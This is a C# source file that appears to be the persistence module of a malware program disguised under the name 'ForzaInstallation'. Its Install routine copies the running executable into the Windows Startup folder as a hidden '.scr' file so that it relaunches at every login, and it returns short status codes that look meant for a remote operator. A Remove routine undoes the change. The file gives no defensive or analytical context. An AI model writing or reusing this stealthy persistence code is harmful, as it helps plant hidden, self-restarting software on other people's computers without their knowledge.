using System.IO;

namespace ForzaInstallation.Persistence
{
    internal static class StartupFolder
    {
        internal static string Install()
        {
            try
            {
                var src = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var startup = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup), "ForzaInstallation.scr");
                File.Copy(src, startup, true);
                File.SetAttributes(startup, FileAttributes.Hidden);
                return "STARTUP:OK";
            }
            catch { return "STARTUP:FAIL"; }
        }

        internal static string Remove()
        {
            try
            {
                var startup = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup), "ForzaInstallation.scr");
                if (File.Exists(startup)) File.Delete(startup);
                return "STARTUP removed";
            }
            catch { return "STARTUP remove failed"; }
        }
    }
}
